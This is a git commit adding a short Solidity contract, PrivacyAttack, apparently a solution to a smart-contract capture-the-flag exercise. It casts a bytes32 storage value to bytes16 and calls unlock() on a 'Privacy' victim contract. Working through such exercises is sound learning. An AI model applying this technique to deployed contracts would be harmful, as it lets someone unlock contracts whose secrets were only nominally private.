cbb038bb7d3e0fb82e5714caeaca28017236ad16
Aitor Zaldua <aitor.zaldua@draftdigital.org>
2022-11-19 14:57:28 +0100

    privacy.sol y attack

---
+++ contracts/PrivacyAttack.sol
@@ -0,0 +1,22 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "./Privacy.sol";
+
+import "hardhat/console.sol";
+
+contract PrivacyAttack {
+  
+    Privacy public victimContract;
+
+    constructor (address _victimContractAddr) {
+        victimContract = Privacy(_victimContractAddr);
+    }
+
+    function attack (bytes32 _unlockPwd) public {   
+        bytes16 key;
+        key = bytes16(_unlockPwd);
+        victimContract.unlock(key);
+    }
+
+}
